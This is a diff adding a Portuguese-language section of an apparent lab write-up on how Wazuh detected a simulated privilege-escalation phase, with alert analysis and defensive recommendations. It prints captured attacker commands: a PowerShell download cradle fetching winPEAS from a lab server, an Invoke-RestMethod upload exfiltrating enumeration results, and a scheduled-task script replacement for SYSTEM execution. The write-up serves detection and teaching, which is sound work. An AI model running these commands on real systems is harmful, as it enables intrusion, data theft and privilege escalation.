@@ -895,8 +895,237 @@ A fase de acesso inicial foi plenamente detetada pelo Wazuh com base em:
 Estes dados permitiriam uma **ação de resposta imediata e eficaz** por parte de um SOC ou EDR automatizado.
 
 ---
+<br/>
+<br/>
+
+#  Fase 2 — Escalada de Privilégios
+
+<br/>
+<br/>
+
+##  Alertas Gerados
+
+<p align="center">
+<br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/e5280d6f-2b8c-4c14-abc5-c4fc6d2e3ce4" height="80%" width="80%"/>
+ <br/>
+   <br/>
+ <img src="https://github.com/user-attachments/assets/1e52597f-becb-4683-aba3-110be8ba0ec9" height="80%" width="80%"/>
+    <br/>
+    <br/>
+  <p/>
+
+> Durante esta fase, é evidente o início da pós-exploração, com o objetivo de obter controlo privilegiado sobre o sistema. As imagens mostram uma sequência coordenada de alertas relacionados com execução de código, comunicações de rede, movimentação lateral e potenciais alterações ao sistema para persistência.
+
+<br/>
+<br/>
+
+###  Padrões identificados:
+- Utilização de **PowerShell para executar comandos remotamente**.
+- **Exfiltração de dados** usando `Invoke-RestMethod`.
+- Comunicação com um servidor de controlo na porta **8080**, usada para upload e download de scripts e resultados.
+- Execução de binários do sistema (`icacls.exe`, `schtasks.exe`) a partir de localizações suspeitas.
+- Alertas sobre **possível execução de código via strings**, download cradles e criação ou alteração de scripts `.ps1`.
+
+<br/>
+<br/>
+
+> ⚠️ Estes eventos indicam claramente uma **fase de escalada de privilégios local**, na qual o atacante procura aumentar o seu nível de acesso, manter persistência e preparar fases subsequentes de exploração.
+
+---
+
+<br/>
+<br/>
+
+##  1. Transferência de Script PowerShell via HTTP (winPEAS)
+
+<p align="center">
+<br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/7f11b134-5041-4fb8-ad49-064e94ae245e" height="80%" width="80%"/>
+ <br/>
+   <br/>
+ <img src="https://github.com/user-attachments/assets/59382103-474c-4647-a342-669e9b19e7d0" height="80%" width="80%"/>
+    <br/>
+    <br/>
+  <p/>
+
+> ⚠️ Foi detetada uma ligação de rede iniciada pelo processo `powershell.exe` para o endereço **192.168.1.205** na porta **8080**, seguida da execução de um comando para descarregar e executar um script e o seu output armazenado num ficheiro.
+
+---
+
+<br/>
+<br/>
+
+### Detalhes do Comportamento
+
+- **Processo responsável**: `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`
+- **Comando executado**:
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.205:8080/winPEASps1.ps1') | Out-File "$env:USERPROFILE\Downloads\winpeas.txt" -Encoding ASCII
+```
+- **Origem da ligação**: `192.168.1.206`
+- **Destino da ligação**: `192.168.1.205:8080`
+- **Canal de eventos**: `Microsoft-Windows-PowerShell/Operational`
+- **Tipo de evento**:
+  - `4104` — Execução de ScriptBlock
+  - `3` — Conexão de rede via PowerShell
+<br/>
+<br/>
+
+### 🔍 Interpretação Defensiva
+
+Este conjunto de eventos mostra um **comportamento clássico de pós-exploração**, onde o atacante utiliza o PowerShell para descarregar ferramentas auxiliares como o **winPEAS**, com o intuito de **enumerar o sistema local** e identificar potenciais vetores de escalada de privilégios, neste caso para escapar ao Windows defender foi descarregado um script para enumeração simples sendo assim evasiva.
+
+O uso da função `IEX` (Invoke-Expression), aliado ao `DownloadString`, constitui um **método típico de execução fileless**. O ficheiro é descarregado diretamente para a memória e armazenado localmente.
+
+---
+
+<br/>
+<br/>
+
+##  2. Exfiltração de Dados via `Invoke-RestMethod`
+
+<p align="center">
+<br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/24a355a3-bcbc-41f6-b55e-17b159e18763" height="80%" width="80%"/>
+    <br/>
+    <br/>
+  <p/>
+
+>  ⚠️ Este alerta registado pela Wazuh demonstra claramente a **exfiltração do ficheiro** para um servidor remoto, usando o comando `Invoke-RestMethod` com o método HTTP `PUT`.
+
+---
+
+<br/>
+<br/>
+
+### Detalhes técnicos do alerta:
+
+- **Comando invocado**:
+  ```powershell
+  Invoke-RestMethod -Uri "http://192.168.1.205:8080/winpeas.txt" -Method PUT -InFile "C:\Users\jsilva\Downloads\winpeas.txt"
+  ```
+- **Canal**: Microsoft-Windows-PowerShell/Operational  
+- **Ficheiro exfiltrado**: `winpeas.txt`, gerado anteriormente com os resultados da enumeração feita via WinPEAS  
+- **Destino remoto**: `192.168.1.205` na porta `8080` (servidor de receção configurado pelo atacante)
+- **Processo associado**: `powershell.exe` com PID `8296`  
+- **Severidade**: `INFORMATION`, mas com conteúdo altamente sensível
+
+---
+<br/>
+<br/>
+
+**Contexto adicional:**
+
+O payload revela que a sessão PowerShell foi iniciada com parâmetros evasivos:
+- `-NoProfile`
+- `-ExecutionPolicy Bypass`
+
+A exfiltração é realizada após a execução do script de enumeração, e demonstra a tentativa de **subtrair dados críticos do sistema de forma encoberta**, usando um canal HTTP simples e fácil de omitir inspeção profunda de pacotes (DPI).
+
+<br/>
+<br/>
+
+##  3. Verificação de Permissões e Substituição Maliciosa de Script Agendado
+
+<br/>
+<br/>
+
+O próximo conjunto de alertas revela um comportamento ofensivo associado à **elevação de privilégios através da substituição de ficheiros** usados por tarefas agendadas.
+
+<br/>
+<br/>
+
+### 🛠 Alerta 1: Execução de `icacls.exe`
+
+<p align="center">
+<br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/c1c44292-71c0-4a4b-83c4-4362eefe1ddf" height="80%" width="80%"/>
+    <br/>
+    <br/>
+  <p/>
+
+- **Comando Executado**:
+  ```cmd
+  C:\Windows\system32\icacls.exe C:\TempTask\svc_launcher.ps1
+  ```
+- **Objetivo**: Enumerar permissões do ficheiro `svc_launcher.ps1` localizado em `C:\TempTask`, usado pelo sistema.
+- **Processo Parent**: `powershell.exe` com comando TCPClient típico de backdoor.
+
+<br/>
+<br/>
+
+> ⚠️ Este comportamento revela a **intenção de analisar permissões** para determinar se o ficheiro podia ser substituído.
+
+<br/>
+<br/>
+
+### 🛠 Alerta 2: `Invoke-WebRequest` com Substituição do Script!
+
+<p align="center">
+<br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/9704dda8-e6f2-4005-a17e-b57383e19be3" height="80%" width="80%"/>
+    <br/>
+    <br/>
+  <p/>
 
 
+- **Comando PowerShell**:
+  ```powershell
+  Invoke-WebRequest -Uri "http://192.168.1.205:8080/svc_launcher.ps1" -OutFile "C:\TempTask\svc_launcher.ps1"
+  ```
+- **Intenção**: Substituir o ficheiro legítimo por uma versão maliciosa descarregada do servidor remoto.
 
+<br/>
+<br/>
 
+**⚠️ Contexto de Abuso**:
+- O ficheiro `svc_launcher.ps1` encontrava-se **mal protegido**, com permisões elevadas e configurado para ser executado por uma **tarefa automática ao arranque do sistema**.
+- Ao substituí-lo, o atacante assegura que o **script malicioso será executado com privilégios SYSTEM** na próxima reinicialização.
 
+---
+
+<br/>
+<br/>
+
+**Conclusão:**
+Estes eventos representam uma tentativa clara de **elevação de privilégios por substituição de scripts agendados**.  
+O atacante validou permissões com `icacls` e, ao confirmar fragilidades, usou `Invoke-WebRequest` para implantar um payload malicioso. Esta técnica é comum em **ataques de persistência e privilege escalation**, explorando **tarefas de sistema mal configuradas**.
+
+<br/>
+<br/>
+
+## ✅ **Conclusão da Fase 2**
+
+<br/>
+<br/>
+
+#### **Resumo dos indicadores detetados:**
+
+- **Execução de PowerShell com parâmetros de evasão**, incluindo `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`.
+- **Download de scripts via HTTP** através de `Invoke-WebRequest` e `DownloadString`, envolvendo IP interno `192.168.1.205` na porta `8080`.
+- **Ferramenta de enumeração `winPEAS` transferida e executada** no sistema.
+- **Exfiltração de dados com `Invoke-RestMethod`**, enviando ficheiros `.txt` com resultados da enumeração para o servidor remoto.
+- **Substituição de script legítimo (`svc_launcher.ps1`) por versão maliciosa**, com permissões permissivas na pasta `C:\TempTask\`.
+- **Técnica de Escalada de Privilégios via tarefa agendada**, visando execução com permissões SYSTEM.
+
+<br/>
+<br/>
+    
+#### 🔐 **Recomendações:**
+
+- **Monitorizar e bloquear o uso de PowerShell com parâmetros suspeitos** (`Bypass`, `Hidden`, `NoProfile`) através de regras em EDR/SIEM.
+- **Restringir comunicações para IPs internos em portas incomuns** (ex: `8080`) e inspecionar atividades de rede não autorizadas.
+- **Aplicar permissões rigorosas em diretórios sensíveis**, como `C:\TempTask\`, impedindo escrita por utilizadores sem privilégios elevados.
+- **Auditar e validar tarefas agendadas** que executam scripts PowerShell no arranque.
+- **Implementar AppLocker ou WDAC** para limitar a execução de scripts não assinados e ferramentas de pós-exploração
+
+---
+
+<br/>
+<br/>
